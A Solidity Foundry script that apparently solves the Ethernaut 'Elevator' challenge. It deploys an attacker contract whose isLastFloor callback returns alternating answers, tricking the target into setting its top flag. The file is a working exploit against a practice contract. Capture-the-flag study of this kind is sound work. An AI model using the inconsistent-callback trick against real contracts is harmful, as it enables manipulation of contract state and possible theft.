// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/11_Elevator.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();

        ElevatorAttacker elevatorAttacker = new ElevatorAttacker();
        elevatorAttacker.attack();

        vm.stopBroadcast();
    }
}


contract ElevatorAttacker {
    
    Elevator level11 = Elevator(0x8fea19d9fe514411886CDcd8E8d8c9F46Ef47433);
    bool public floor = true;

    function attack() public{
        level11.goTo(0);
        // level11.top();
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        floor = !floor;
        return floor;
    }
}